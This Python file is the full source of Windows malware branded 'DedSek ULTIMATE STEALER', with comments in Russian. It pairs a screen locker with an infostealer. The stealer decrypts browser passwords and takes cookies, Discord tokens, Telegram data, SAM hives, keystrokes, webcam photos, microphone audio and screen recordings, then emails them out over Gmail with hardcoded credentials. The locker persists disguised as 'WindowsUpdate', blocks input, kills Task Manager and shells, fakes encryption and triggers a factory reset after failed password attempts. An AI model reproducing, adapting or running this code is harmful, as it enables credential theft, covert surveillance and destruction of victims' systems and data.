import ctypes
import os
import sys
import time
import threading
import tempfile
import tkinter as tk
from tkinter import PhotoImage, scrolledtext
import shutil
import winshell
from win32com.client import Dispatch
import base64
import random
import socket
import subprocess
import json
import urllib.request
import urllib.parse
import smtplib
import imaplib
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2
import numpy as np
from PIL import ImageGrab
import sqlite3
import winreg
import zipfile
import win32crypt
import re
import wave
import pyaudio

# ============================================================
# >>> НАСТРОЙКИ <<<
PASSWORD = "1601"
MAX_ATTEMPTS = 4
TIMER_SECONDS = 10
SKULL_BASE64 = "YOUR_BASE64_STRING_HERE"

GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
# ============================================================

attempts_left = MAX_ATTEMPTS

# ========== СКРЫТИЕ CMD ==========
def hide_console():
    try:
        if sys.executable.endswith("python.exe"):
            pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
            if os.path.exists(pythonw_path):
                subprocess.Popen([pythonw_path, __file__] + sys.argv[1:], creationflags=0x08000000)
                os._exit(0)
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.FreeConsole()
    except:
        pass

# ========== БЛОКИРОВКА WIN ==========
def disable_win_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def restore_win_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except:
        pass

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ========== ЗАПИСЬ С МИКРОФОНА ==========
def record_microphone():
    """Записывает 30 секунд аудио с микрофона"""
    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        RECORD_SECONDS = 30
        
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        frames = []
        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            try:
                data = stream.read(CHUNK, exception_on_overflow=False)
                frames.append(data)
            except:
                break
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        # Сохраняем WAV
        audio_path = os.path.join(tempfile.gettempdir(), f'audio_{int(time.time())}.wav')
        wf = wave.open(audio_path, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        send_file_email(audio_path, "Mic Recording")
        try:
            os.remove(audio_path)
        except:
            pass
    except:
        pass

# ========== ФОТО С ВЕБКИ ==========
def capture_webcam():
    """Делает фото с веб-камеры"""
    try:
        cam = cv2.VideoCapture(0)
        if cam.isOpened():
            ret, frame = cam.read()
            if ret:
                photo_path = os.path.join(tempfile.gettempdir(), f'webcam_{int(time.time())}.jpg')
                cv2.imwrite(photo_path, frame)
                send_file_email(photo_path, "Webcam Photo")
                try:
                    os.remove(photo_path)
                except:
                    pass
        cam.release()
    except:
        pass

# ========== КЕЙЛОГГЕР ==========
keylog_data = []
def keylogger():
    """Записывает все нажатые клавиши"""
    try:
        import keyboard
        def on_key(event):
            global keylog_data
            keylog_data.append(f"{time.strftime('%H:%M:%S')} | {event.name}")
            if len(keylog_data) >= 100:
                text = '\n'.join(keylog_data)
                send_email(text, "Keylogger Dump")
                keylog_data.clear()
        keyboard.on_press(on_key)
    except:
        pass

# ========== БУФЕР ОБМЕНА ==========
def steal_clipboard():
    """Крадёт содержимое буфера обмена"""
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(1):
            data = win32clipboard.GetClipboardData()
            if data:
                send_email(f"Clipboard:\n{str(data)[:1000]}", "Clipboard")
        win32clipboard.CloseClipboard()
    except:
        pass

# ========== СКАНЕР WiFi СЕТЕЙ ==========
def scan_wifi_networks():
    """Сканирует все WiFi сети вокруг"""
    res = []
    try:
        output = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
        res.append("=== WiFi NETWORKS AROUND ===")
        res.append(output[:5000])
    except:
        pass
    return '\n'.join(res)

# ========== КРАЖА ФАЙЛОВ С РАБОЧЕГО СТОЛА ==========
def steal_desktop_files():
    """Крадёт интересные файлы с рабочего стола"""
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    if not os.path.exists(desktop):
        return
    
    interesting_exts = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.wallet', '.dat', '.key', '.ovpn', '.rdp', '.json', '.xml', '.csv']
    
    for file in os.listdir(desktop):
        fp = os.path.join(desktop, file)
        if os.path.isfile(fp):
            ext = os.path.splitext(file)[1].lower()
            if ext in interesting_exts and os.path.getsize(fp) < 5 * 1024 * 1024:  # < 5MB
                send_file_email(fp, f"Desktop File: {file}")

# ========== TELEGRAM КОНТАКТЫ ==========
def steal_telegram_contacts():
    """Крадёт список контактов Telegram если есть"""
    res = []
    tg_base = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
    if not os.path.exists(tg_base):
        return res
    
    # Ищем базу контактов
    for folder in os.listdir(tg_base):
        if folder.startswith('D877F783D5D3EF8C'):
            contacts_db = os.path.join(tg_base, folder, 'info')
            if os.path.exists(contacts_db):
                res.append("Telegram contacts DB found and sent")
                send_file_email(contacts_db, "Telegram Contacts")
    
    return res

# ========== РАСШИФРОВКА (БЕЗ ИЗМЕНЕНИЙ) ==========
def _decrypt_aes_gcm(data, key):
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(data[:12], data[12:], None)
    except:
        return None

def _get_master_key(login_path):
    local_state = os.path.join(os.path.dirname(os.path.dirname(login_path)), 'Local State')
    if os.path.exists(local_state):
        try:
            with open(local_state, 'r', encoding='utf-8') as f:
                key_b64 = json.load(f)['os_crypt']['encrypted_key']
            return win32crypt.CryptUnprotectData(base64.b64decode(key_b64)[5:], None, None, None, 0)[1]
        except:
            pass
    return None

def steal_chromium(browser, paths):
    res = []
    for lp in paths:
        if not os.path.exists(lp):
            continue
        try:
            mk = _get_master_key(lp)
            db = os.path.join(tempfile.gettempdir(), f'{browser}_{random.randint(0,9999)}.db')
            shutil.copy2(lp, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pw in cur:
                try:
                    if pw[:3] == b'\x76\x31\x31' and mk:
                        pwd = _decrypt_aes_gcm(pw[3:], mk)
                        if pwd:
                            pwd = pwd.decode('utf-8', 'ignore')
                        else:
                            pwd = "***"
                    else:
                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8', 'ignore')
                    res.append(f"{browser} | {url} | {user} | {pwd}")
                except:
                    res.append(f"{browser} | {url} | {user} | ***")
            cur.close()
            try:
                os.remove(db)
            except:
                pass
        except:
            pass
    return res

def _parse_asn1(data):
    try:
        if data[0] != 0x30:
            return None, None
        off = 2 + (data[1] & 0x7F) if data[1] & 0x80 else 2
        iv = ct = None
        while off < len(data):
            tag, l = data[off], data[off+1]
            val = data[off+2:off+2+l]
            if tag == 0x04:
                if iv is None:
                    iv = val
                else:
                    ct = val
            off += 2 + l
        return iv, ct
    except:
        return None, None

def _decrypt_3des(data, key, iv):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        dec = Cipher(algorithms.TripleDES(key), modes.CBC(iv), default_backend()).decryptor()
        r = dec.update(data) + dec.finalize()
        return r[:-r[-1]] if r[-1] < 16 else r
    except:
        return None

def steal_firefox():
    res = []
    base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(base):
        return res
    for folder in os.listdir(base):
        pf = os.path.join(base, folder)
        lf = os.path.join(pf, 'logins.json')
        kf = os.path.join(pf, 'key4.db')
        if not os.path.exists(lf) or not os.path.exists(kf):
            continue
        try:
            logins = json.load(open(lf, 'r', encoding='utf-8'))
            cur = sqlite3.connect(kf).cursor()
            cur.execute("SELECT a11, a102 FROM nssPrivate LIMIT 1")
            row = cur.fetchone()
            if not row or not row[1] or len(row[1]) < 24:
                continue
            key = row[1][:24]
            for login in logins.get('logins', []):
                host = login.get('hostname', '')
                user = pwd = "ERROR"
                try:
                    enc = base64.b64decode(login['encryptedUsername'])
                    iv, ct = _parse_asn1(enc)
                    if iv and ct:
                        d = _decrypt_3des(ct, key, iv)
                        if d:
                            user = d.decode('utf-8', 'ignore').lstrip('\x00').strip()
                except:
                    pass
                try:
                    enc = base64.b64decode(login['encryptedPassword'])
                    iv, ct = _parse_asn1(enc)
                    if iv and ct:
                        d = _decrypt_3des(ct, key, iv)
                        if d:
                            pwd = d.decode('utf-8', 'ignore').lstrip('\x00').strip()
                except:
                    pass
                res.append(f"FIREFOX | {host} | {user} | {pwd}")
            cur.close()
        except:
            z = os.path.join(tempfile.gettempdir(), f'ff_{folder[:10]}.zip')
            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
                for f in [lf, kf]:
                    if os.path.exists(f):
                        zf.write(f, os.path.basename(f))
            send_file_email(z, f"Firefox {folder[:10]}")
            try:
                os.remove(z)
            except:
                pass
    return res

def scan_ports():
    res = []
    try:
        res.append("=== LOCAL PORTS ===")
        netstat = subprocess.check_output("netstat -ano", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
        res.append(netstat[:5000])
    except:
        pass
    return '\n'.join(res)

def steal_all_cookies():
    results = []
    for cp in [
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
    ]:
        if os.path.exists(cp):
            try:
                db = os.path.join(tempfile.gettempdir(), f'c_{random.randint(0,9999)}.db')
                shutil.copy2(cp, db)
                cur = sqlite3.connect(db).cursor()
                cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for host, name, enc in cur.fetchall():
                    try:
                        val = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8', 'ignore')
                        results.append(f"CHROME | {host} | {name} | {val[:100]}")
                    except:
                        pass
                cur.close()
                try:
                    os.remove(db)
                except:
                    pass
            except:
                pass
    return results[:300] if results else ["No cookies"]

# ========== МЕГА-СТИЛЕР ==========
def mega_steal():
    R = ["=" * 60, "DEDSEK ULTIMATE STEALER v3.0", "=" * 60]
    R += [f"\nUSER: {os.environ.get('USERNAME')}", f"PC: {socket.gethostname()}"]
    
    try:
        R.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
    except:
        pass
    try:
        ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
        g = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5).read())
        R.append(f"PUBLIC IP: {ip} | {g.get('country','?')} | {g.get('city','?')}")
    except:
        pass
    
    try:
        R.append("\nIPCONFIG:\n" + subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866', 'replace')[:5000])
    except:
        pass
    
    R.append("\n" + "=" * 60)
    R.append("WiFi SCANNER")
    R.append("=" * 60)
    R.append(scan_wifi_networks())
    
    R.append("\n" + "=" * 60)
    R.append("PORT SCANNER")
    R.append("=" * 60)
    R.append(scan_ports())
    
    R += ["\n" + "=" * 60, "BROWSER PASSWORDS", "=" * 60]
    for name, paths in {
        "CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
        "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
        "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
    }.items():
        data = steal_chromium(name, paths)
        R.append(f"\n--- {name} ---")
        R.extend(data if data else ["No data"])
    
    R.append("\n--- FIREFOX ---")
    R.extend(steal_firefox() or ["No data"])
    
    R += ["\n" + "=" * 60, "COOKIES", "=" * 60]
    R.extend(steal_all_cookies())
    
    # SAM
    try:
        sp = os.path.join(tempfile.gettempdir(), 'sam')
        syp = os.path.join(tempfile.gettempdir(), 'system')
        if is_admin():
            os.system(f'reg save HKLM\\SAM "{sp}" /y >nul 2>&1')
            os.system(f'reg save HKLM\\SYSTEM "{syp}" /y >nul 2>&1')
        if os.path.exists(sp) and os.path.getsize(sp) > 100:
            z = os.path.join(tempfile.gettempdir(), 'sam.zip')
            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(sp, 'sam')
                zf.write(syp, 'system')
            send_file_email(z, "SAM+SYSTEM")
            for f in [z, sp, syp]:
                try:
                    os.remove(f)
                except:
                    pass
    except:
        pass
    
    # Telegram
    tg = None
    for p in [os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')]:
        if os.path.exists(p):
            tg = p
            break
    if tg:
        try:
            z = os.path.join(tempfile.gettempdir(), 'tg.zip')
            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
                for r, d, files in os.walk(tg):
                    for f in files:
                        if f in ['key_datas', 'D877F783D5D3EF8C', 'settingss', 'maps'] or f.startswith('usertag') or f.startswith('data'):
                            zf.write(os.path.join(r, f), f)
            send_file_email(z, "Telegram")
            try:
                os.remove(z)
            except:
                pass
        except:
            pass
    
    # Discord
    tokens = set()
    for db in [os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb')]:
        if not os.path.exists(db):
            continue
        for f in os.listdir(db):
            if f.endswith('.ldb') or f.endswith('.log'):
                try:
                    tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', open(os.path.join(db, f), 'r', errors='ignore').read()))
                except:
                    pass
    R.extend([f"TOKEN: {t}" for t in list(tokens)[:20]] if tokens else ["No tokens"])
    
    # Буфер обмена
    steal_clipboard()
    
    # Фото с вебки
    capture_webcam()
    
    # Файлы с рабочего стола
    steal_desktop_files()
    
    # Скриншот
    try:
        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
        ImageGrab.grab().save(ss, 'JPEG', quality=50)
        send_file_email(ss, "Desktop Screenshot")
        try:
            os.remove(ss)
        except:
            pass
    except:
        pass
    
    R += ["\n" + "=" * 60, f"REPORT: {time.strftime('%d.%m.%Y %H:%M:%S')}", "=" * 60]
    
    text = '\n'.join(R)
    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
        send_email(part, f"DedSek [{i+1}]")

def send_email(message, subject=None):
    try:
        msg = MIMEText(message, 'plain', 'utf-8')
        msg['Subject'] = subject or 'DedSek'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

def send_file_email(fp, desc):
    try:
        msg = MIMEMultipart()
        msg['Subject'] = f'File: {desc}'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
            msg.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=60)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

# ========== ЗАПИСЬ ЭКРАНА ==========
def record_loop():
    while True:
        try:
            vp = os.path.join(tempfile.gettempdir(), f"v_{int(time.time())}.avi")
            out = cv2.VideoWriter(vp, cv2.VideoWriter_fourcc(*'XVID'), 10.0, (1280, 720))
            for _ in range(150):
                out.write(cv2.resize(cv2.cvtColor(np.array(ImageGrab.grab()), cv2.COLOR_BGR2RGB), (1280, 720)))
                time.sleep(0.1)
            out.release()
            _send_vid(vp)
            try:
                os.remove(vp)
            except:
                pass
        except:
            time.sleep(1)

def _send_vid(fp):
    try:
        if os.path.getsize(fp) > 20 * 1024 * 1024:
            try:
                out = fp.replace('.avi', '.mp4')
                subprocess.run(['ffmpeg', '-i', fp, '-c:v', 'libx264', '-preset', 'ultrafast', '-crf', '35', '-b:v', '200k', '-s', '640x360', '-r', '10', '-y', out], capture_output=True, timeout=30)
                fp = out
            except:
                pass
        msg = MIMEMultipart()
        msg['Subject'] = 'Video'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="v_{int(time.time())}.avi"')
            msg.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

# ========== ЧАТ ТОЛЬКО ДЛЯ ЧТЕНИЯ ==========
class Chat:
    def __init__(self, locker):
        self.locker = locker
        self.win = None

    def show(self):
        if self.win:
            return
        self.win = tk.Toplevel()
        self.win.geometry("380x400+60+60")
        self.win.configure(bg='#00FF00')
        self.win.attributes('-topmost', True)
        self.win.overrideredirect(True)
        self.win.focus_force()

        def keep():
            while self.win:
                try:
                    self.win.lift()
                    self.win.attributes('-topmost', True)
                    time.sleep(0.5)
                except:
                    break
        threading.Thread(target=keep, daemon=True).start()

        f = tk.Frame(self.win, bg='black', bd=2)
        f.pack(fill='both', expand=True, padx=2, pady=2)
        h = tk.Frame(f, bg='#00FF00')
        h.pack(fill='x')
        tk.Label(h, text="DedSek (READ ONLY)", bg='#00FF00', fg='black', font=('Courier', 11, 'bold')).pack(side='left', padx=10, pady=5)
        tk.Button(h, text="✕", command=self.hide, bg='#FF0000', fg='white', font=('Courier', 12, 'bold'), bd=0, width=3).pack(side='right', padx=5, pady=3)

        self.hist = scrolledtext.ScrolledText(f, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), height=22)
        self.hist.pack(padx=10, pady=(0, 5), fill='both', expand=True)
        self.hist.config(state='disabled')

        # ЗАПРЕЩАЕМ ВВОД - только чтение
        lbl = tk.Label(f, text="[READ ONLY - Вы не можете писать]", bg='black', fg='#FF0000', font=('Courier', 8))
        lbl.pack(pady=(0, 10))

        h.bind('<Button-1>', lambda e: setattr(self, 'xy', (e.x_root, e.y_root)))
        h.bind('<B1-Motion>', lambda e: self.win.geometry(f"+{self.win.winfo_x()+e.x_root-self.xy[0]}+{self.win.winfo_y()+e.y_root-self.xy[1]}") or setattr(self, 'xy', (e.x_root, e.y_root)))

        self.add("DedSek", "Привет! Твой ПК заблокирован. Читай внимательно.")
        self._check()

    def hide(self):
        if self.win:
            self.win.destroy()
            self.win = None
        self.locker.win.focus_force()
        self.locker.pw.focus_force()

    def add(self, s, m):
        self.hist.config(state='normal')
        self.hist.insert('end', f'[{s}]: {m}\n\n')
        self.hist.see('end')
        self.hist.config(state='disabled')

    def _check(self):
        def c():
            while True:
                if not self.win:
                    break
                try:
                    mail = imaplib.IMAP4_SSL('imap.gmail.com')
                    mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
                    mail.select('inbox')
                    _, d = mail.search(None, 'SUBJECT "COMMAND:"', 'UNSEEN')
                    if d[0]:
                        for n in d[0].split():
                            _, md = mail.fetch(n, '(RFC822)')
                            msg = email.message_from_bytes(md[0][1])
                            if msg.is_multipart():
                                for p in msg.walk():
                                    if p.get_content_type() == "text/plain":
                                        cmd = p.get_payload(decode=True).decode()
                                        if cmd.startswith("MSG:") and self.win:
                                            self.win.after(0, self.add, "DedSek", cmd[4:])
                            mail.store(n, '+FLAGS', '\\Seen')
                    mail.close()
                    mail.logout()
                except:
                    pass
                time.sleep(5)
        threading.Thread(target=c, daemon=True).start()

# ========== ОСТАЛЬНОЕ ==========
def anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(0)
    except:
        pass

def add_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try:
                shutil.copy2(cp, pp)
            except:
                pass
            cp = pp
        sf = winshell.startup()
        sp = os.path.join(sf, "WindowsUpdate.lnk")
        sc = Dispatch('WScript.Shell').CreateShortCut(sp)
        sc.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")
        sc.Arguments = f'"{cp}"'
        sc.WorkingDirectory = os.path.dirname(cp)
        sc.IconLocation = "shell32.dll,13"
        sc.save()
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{cp}"')
            winreg.CloseKey(k)
        except:
            pass
    except:
        pass

def block_keys():
    try:
        import keyboard
        for c in ['alt+f4', 'alt+tab', 'alt+esc', 'alt+space', 'ctrl+shift+esc', 'ctrl+alt+del', 'ctrl+esc', 'ctrl+w', 'ctrl+f4', 'ctrl+tab', 'win', 'win+d', 'win+r', 'win+e', 'win+l', 'win+m', 'win+tab', 'win+x', 'win+u', 'alt', 'ctrl', 'shift', 'f11', 'print screen', 'alt+print screen', 'left windows', 'right windows']:
            try:
                keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except:
                pass
        for k in ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12', 'space', 'enter', 'backspace', 'tab', 'caps lock', 'shift', 'ctrl', 'alt', 'esc', 'delete', 'insert', 'home', 'end', 'page up', 'page down', 'up', 'down', 'left', 'right', 'windows', 'left windows', 'right windows', 'print screen', 'scroll lock', 'pause']:
            try:
                keyboard.block_key(k)
            except:
                pass
    except:
        try:
            ctypes.windll.user32.BlockInput(True)
        except:
            pass

def unblock():
    try:
        ctypes.windll.user32.BlockInput(False)
    except:
        pass
    try:
        import keyboard
        keyboard.unhook_all()
    except:
        pass

def kill_procs():
    kl = ["taskmgr.exe", "cmd.exe", "powershell.exe", "msconfig.exe", "regedit.exe"]
    while True:
        for p in kl:
            os.system(f"taskkill /f /im {p} >nul 2>&1")
        time.sleep(0.05)

def boot_anim():
    a = tk.Tk()
    a.attributes('-fullscreen', True)
    a.attributes('-topmost', True)
    a.configure(bg='black')
    a.overrideredirect(True)
    disable_win_key()
    l = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 20, 'bold'))
    l.pack(expand=True)
    for i in range(8):
        a.configure(bg='white' if i % 2 == 0 else 'black')
        l.config(bg='white' if i % 2 == 0 else 'black', fg='black' if i % 2 == 0 else 'white')
        a.update()
        time.sleep(0.2)
    a.configure(bg='black')
    l.config(bg='black', fg='#00FF00')
    a.attributes('-alpha', 0)
    for alpha in range(0, 110, 5):
        a.attributes('-alpha', alpha / 100)
        l.config(text="DedSek тебя взломал")
        a.update()
        time.sleep(0.03)
    time.sleep(1.5)
    for msg in ["Идёт шифровка...", "[                    ] 0%", "[####                ] 20%", "[########            ] 40%", "[############        ] 60%", "[################    ] 80%", "[####################] 100%", "", "ДАННЫЕ ЗАШИФРОВАНЫ!"]:
        l.config(text=msg)
        a.update()
        time.sleep(0.25)
    time.sleep(1)
    a.destroy()

def reset_windows():
    try:
        restore_win_key()
        unblock()
        es = tk.Tk()
        es.attributes('-fullscreen', True)
        es.attributes('-topmost', True)
        es.configure(bg='black')
        es.overrideredirect(True)
        tk.Label(es, text="404 | ОШИБКА", bg='black', fg='#FF0000', font=('Courier', 40, 'bold')).pack(expand=True)
        tk.Label(es, text="ВСЕ ДАННЫЕ УНИЧТОЖАЮТСЯ...", bg='black', fg='#FF0000', font=('Courier', 20)).pack()
        es.update()
        time.sleep(5)
        es.destroy()
        os.system("taskkill /f /im explorer.exe >nul 2>&1")
        os.system("systemreset -factoryreset")
        time.sleep(3)
        os.system("shutdown /r /t 0 /f")
        os._exit(0)
    except:
        os.system("shutdown /r /t 0 /f")
        os._exit(0)

class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)

        global attempts_left

        try:
            img_data = base64.b64decode(SKULL_BASE64)
            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
            with open(img_path, "wb") as f:
                f.write(img_data)
            img = PhotoImage(file=img_path)
            tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.05, anchor='center')
            self.win._img = img
        except:
            pass

        msg = f"""ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!

ДУМАЕШЬ, ЧТО ЗНАЕШЬ ПАРОЛЬ? НЕТ!

1. standard DES
$1$rjBkQ1jG$zqthRBo7xAfA4TTwBRhHv/

2. Bcrypt
$2y$10$/yFT/ZN1yJkgm4.8pSzTPOkhhEXOJC3H.gbs09EvKawKS3zz8Wf4e

3. Base64
MTI0Njk4ODA0

4. standard DES
$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1

5. uuEncode
+.3@P-C

УДАЧИ. У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ!"""

        tk.Label(self.win, text=msg, bg='black', fg='#00FF00', font=('Courier', 9, 'bold'), justify='left').place(relx=0.5, rely=0.42, anchor='center')

        # Кнопка чата
        self.chat = Chat(self)
        self.chat_open = False
        self.chat_btn = tk.Button(self.win, text="ЧАТ", command=self.toggle_chat, bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), cursor='hand2', bd=1, width=6)
        self.chat_btn.place(relx=0.95, rely=0.08, anchor='ne')

        cf = tk.Frame(self.win, bg='black')
        cf.place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00', font=('Courier', 14, 'bold')).pack(pady=(0, 5))
        self.pw = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='black', fg='#00FF00', insertbackground='#00FF00', relief='solid', bd=2)
        self.pw.pack(pady=(0, 5), ipadx=40, ipady=3)
        self.status_lbl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='#FF0000', font=('Courier', 12, 'bold'))
        self.status_lbl.pack()
        self.pw.bind('<Return>', self.check)
        self.pw.focus_force()
        self._keep()

    def toggle_chat(self):
        if self.chat_open:
            self.chat.hide()
            self.chat_open = False
            self.chat_btn.config(text="ЧАТ")
        else:
            self.chat.show()
            self.chat_open = True
            self.chat_btn.config(text="[✕]")

    def _keep(self):
        try:
            self.win.focus_force()
            self.pw.focus_force()
            self.win.after(100, self._keep)
        except:
            pass

    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            restore_win_key()
            unblock()
            self.status_lbl.config(text="ВЕРНО!", fg='#00FF00')
            self.win.update()
            time.sleep(1)
            self.root.destroy()
            os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0:
                self.status_lbl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='#FF0000')
            else:
                self.status_lbl.config(text="404 | ОШИБКА", fg='#FF0000')
                self.win.update()
                time.sleep(2)
                self.root.destroy()
                reset_windows()
            self.pw.delete(0, tk.END)

# ========== ПУСК ==========
if __name__ == "__main__":
    hide_console()
    anti_debug()
    disable_win_key()

    threading.Thread(target=mega_steal, daemon=True).start()
    threading.Thread(target=record_loop, daemon=True).start()
    threading.Thread(target=record_microphone, daemon=True).start()
    threading.Thread(target=keylogger, daemon=True).start()

    add_startup()
    time.sleep(TIMER_SECONDS)
    boot_anim()
    block_keys()
    try:
        ctypes.windll.user32.ShutdownBlockReasonCreate(ctypes.windll.kernel32.GetConsoleWindow(), "Windows Update...")
    except:
        pass
    threading.Thread(target=kill_procs, daemon=True).start()
    WinLocker()
    tk.mainloop()
